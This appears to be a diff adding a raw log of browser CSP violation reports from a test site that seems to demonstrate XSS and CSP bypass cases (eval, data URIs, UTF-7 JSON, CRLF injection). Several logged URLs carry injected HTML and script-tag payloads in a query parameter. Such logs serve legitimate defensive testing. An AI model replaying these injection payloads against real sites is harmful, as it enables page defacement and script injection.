+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/06_meta-js-base64.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [script-sample] => font-color: red;
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+            [script-sample] => font-color: red;
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/+
+            [script-sample] => font-color: red;
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/*
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/*
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/*
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--/*
+            [script-sample] => font-color: red;
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02b_domjs_eval.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02b_domjs_eval.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 8
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/index.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/01_inline.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02c_domjs_function.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/js/02c_domjs_function.js
+            [script-sample] => call to eval() or related function blocked by CSP
+            [line-number] => 9
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [script-sample] => font-color: red;
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edeface!%3C/h1%3E%3C!--
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edefaced!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edefaced!%3C/h1%3E%3C!--
+            [script-sample] => font-color: red;
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edefaced!%3C/h1%3E%3C!--
+            [referrer] => 
+            [blocked-uri] => self
+            [violated-directive] => default-src http://cspv.mohrphium.com:80
+            [source-file] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob%3Ch1%20style=%22font-color:%20red;%22%3Edefaced!%3C/h1%3E%3C!--
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/04_xsstc.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/04_xsstc.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/06_meta-js-base64.php?user=bob%3Ch3%3EWe%20can%20inject%20HTML%3C/h3%3E
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/07_CRLF_injection.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/07_CRLF_injection.php
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02a_domjs_docwrite.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/01_inline.php?user=bob
+            [script-sample] => 
+        var pos=document.URL.indexOf("u...
+            [line-number] => 45
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/02d_domjs_data_uri.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [blocked-uri] => self
+            [violated-directive] => script-src http://cspv.mohrphium.com:80 data://*:*
+            [source-file] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [script-sample] => try {  for(var lastpass_iter=0; lastpass...
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob%3Cscript%20src=%22data/comments.json%22%3E%3C/script%3E
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob
+            [referrer] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob%3Cscript%20src=%22data/comments.json%22%3E%3C/script%3E
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob%3Cscript%20src=%22data/comments.json%22%3E%3C/script%3E
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/05_utf7-json.php?user=bob%3Cscript%20src=%22data/comments.json%22%3E%3C/script%3E
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
+            [line-number] => 102
+            [column-number] => 47
+            [status-code] => 200
+        )
+
+)
+Array
+(
+    [csp-report] => Array
+        (
+            [document-uri] => http://cspv.mohrphium.com/
+            [referrer] => 
+            [violated-directive] => default-src 'self'
+            [original-policy] => default-src 'self'; object-src 'self' data:; script-src 'self' data:; report-uri http://cspv.mohrphium.com/reportv.php;
+            [blocked-uri] => 
+            [source-file] => chrome-extension://gighmmpiobklfepjocnamgkkbiglidom
